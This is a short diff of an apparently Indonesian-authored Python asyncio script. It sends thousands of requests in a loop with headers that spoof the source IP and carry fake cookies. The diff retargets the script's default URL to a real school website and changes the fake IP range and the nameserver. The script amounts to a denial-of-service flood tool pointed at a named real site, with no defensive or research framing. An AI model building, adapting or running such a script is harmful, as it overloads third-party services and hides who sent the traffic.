@@ -3,9 +3,9 @@ import asyncio
 import secrets  # Import modul secrets untuk nilai acak
 
 # Konfigurasi IP palsu
-fake_ip_range = '28.0.0.1/8'
+fake_ip_range = '101.78.64.0/18'
 fake_ip_filter = ['*.lan', '*.local']
-nameserver = ['1.1.1.1']
+nameserver = ['8.8.8.8']
 
 # Buat kustom header dengan alamat IP palsu dan cookie palsu
 custom_headers = {
@@ -27,7 +27,7 @@ async def send_request(url):
         return None
 
 async def main():
-    default_url = 'https://doujindesu.tv'  # URL default
+    default_url = 'http://www.smknulasem.sch.id'  # URL default
     num_requests = 9000 # Jumlah permintaan yang ingin Anda kirim
 
     while True:
